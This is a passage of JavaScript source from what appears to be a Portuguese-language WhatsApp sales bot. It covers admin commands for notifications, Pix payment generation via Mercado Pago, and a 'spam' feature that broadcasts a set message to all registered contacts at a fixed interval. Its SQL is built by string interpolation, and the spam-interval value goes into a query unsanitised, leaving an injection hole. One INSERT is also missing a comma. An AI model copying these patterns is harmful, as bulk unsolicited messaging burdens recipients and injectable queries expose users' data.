        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/ntfbuyconsutavel===") > -1 && Adms.includes(Numero)) {
            Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
            msg = Mensagem_Texto.split("===")

            if (msg[1] === "" || Array_Total_Igual.length != 3) {
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }

            if (msg[1] === "0") {
                Texto = `*NOTIFICAÇÕES DE CONSUTÁVEL COMPRADA DESATIVADAS. ❌*`
                await DataBase_Better.prepare(`UPDATE NOTIFICACOES_GRUPOS SET VALOR = '0' WHERE PARAMETRO = 'NOT_COMPROU_CONSULTAVEL'`).run()
            } else if (msg[1] === "1") {
                Texto = `*NOTIFICAÇÕES DE CONSUTÁVEL COMPRADA ATIVADAS. ✅*`
                await DataBase_Better.prepare(`UPDATE NOTIFICACOES_GRUPOS SET VALOR = '1' WHERE PARAMETRO = 'NOT_COMPROU_CONSULTAVEL'`).run()
            }
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/ntfbuyconsutada===") > -1 && Adms.includes(Numero)) {
            Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
            msg = Mensagem_Texto.split("===")

            if (msg[1] === "" || Array_Total_Igual.length != 3) {
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }

            if (msg[1] === "0") {
                Texto = `*NOTIFICAÇÕES DE CONSULTADA COMPRADA DESATIVADAS. ❌*`
                await DataBase_Better.prepare(`UPDATE NOTIFICACOES_GRUPOS SET VALOR = '0' WHERE PARAMETRO = 'NOT_COMPROU_CONSULTADA'`).run()
            } else if (msg[1] === "1") {
                Texto = `*NOTIFICAÇÕES DE CONSULTADA COMPRADA ATIVADAS. ✅*`
                await DataBase_Better.prepare(`UPDATE NOTIFICACOES_GRUPOS SET VALOR = '1' WHERE PARAMETRO = 'NOT_COMPROU_CONSULTADA'`).run()
            }
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳









        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/spamstatus===") > -1 && Adms.includes(Numero)) {
            Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
            msg = Mensagem_Texto.split("===")
            if (msg[1] === "" || Array_Total_Igual.length != 3) {
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }

            if (msg[1] === "1") {
                Texto = `Mensagem de Spam ativada, envios resetados!`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                await DataBase_Better.prepare(`UPDATE SPAMMER SET VALOR = '1' WHERE PARAMETRO = 'ATIVADO'`).run()
                await DataBase_Better.prepare(`UPDATE CONTATOS SET RECEBEU_SPAM = '2'`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            } else if (msg[1] === "0") {
                Texto = `Mensagem de Spam desativada!`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                await DataBase_Better.prepare(`UPDATE SPAMMER SET VALOR = '0' WHERE PARAMETRO = 'ATIVADO'`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            } else {
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
            return
            // 0 = nada
            // 1 = enviou
            // 2 = nao enviou
            // 3 = erro ao enviar
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/spamintervalo===") > -1 && Adms.includes(Numero)) {
            Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
            msg = Mensagem_Texto.split("===")
            if (msg[1] === "" || Array_Total_Igual.length != 3) {
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
            if (parseInt(msg[1]) < 1) {
                Texto = `Segundos apartir de 1 é permitido.`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }

            await DataBase_Better.prepare(`UPDATE SPAMMER SET VALOR = '${msg[1]}' WHERE PARAMETRO = 'INTERVALO_ENVIO_SEGUNDOS'`).run()
            Texto = `*Intervalo de envio por segundos alterado com sucesso!*

A mensagem de spam será enviada a cada ${msg[1]} segundos para um cliente registrado no bot.`
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            return
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/spamtexto") > -1 && Adms.includes(Numero)) {
            try {
                Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
                msg = Mensagem_Texto.split("===")
                if (msg[1] === "" || Array_Total_Igual.length != 3) {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
                MENSAGEM = (msg[1]).replace(/\'/igm, "");
                await DataBase_Better.prepare(`UPDATE SPAMMER SET VALOR = '${MENSAGEM}' WHERE PARAMETRO = 'TEXTO_ENVIAR'`).run()
                Texto = `*MENSAGEM DE SPAM ALTERADA COM SUCESSO!*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                return
            } catch (error) {
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                return
            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳





        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/pix ") > -1) {
            HABILITAR_PIX_AUTO = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'HABILITAR_PIX_AUTO'`).get()["VALOR"]
            TEXTO_PIX_AUTO_DESATIVADO = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'TEXTO_PIX_AUTO_DESATIVADO'`).get()["VALOR"]
            if (HABILITAR_PIX_AUTO === "0") {
                Texto = TEXTO_PIX_AUTO_DESATIVADO
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
            TOKEN_MP = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'TOKEN_MP'`).get()["VALOR"]
            if (TOKEN_MP === "0") {
                Texto = `⚠️ Erro ao gerar chave pix! O desenvolvedor foi notificado!`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()

                Texto = `⚠️*ATENÇÃO ADMS!*

O USUÁRIO wa.me/${Numero} TENTOU GERAR UM PIX DE PORÉM VOCÊ NÃO DEFINIU O TOKEN DO MERCADO PAGO NO BOT.`
                for await (adm of Adms) {
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us'
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                }
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }

            TITULO_PRODUTO = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'TITULO_PRODUTO'`).get()["VALOR"]

            //console.log(Array_Tentativa_Pix.filter(x => x === Mensagem_From).length)
            if (Array_Tentativa_Pix.filter(x => x === Mensagem_From).length > 2) {
                Texto = `⚠️ Você gerou 3 chaves pix em um espaço curto de tempo... volte em 10 minutos!`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }

            Array_Espacos = Mensagem_Texto.match(/\s/igm);
            if (Array_Espacos.length > 1) {
                Texto = `⚠️ Valor de recarga suspeita, Vá em adicionar saldo e aprenda a utilizar devidamente o comando.`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }

            msg = Mensagem_Texto.split(" ")

            VALOR_RECARGA = msg[1]

            if (VALOR_RECARGA === "") {
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
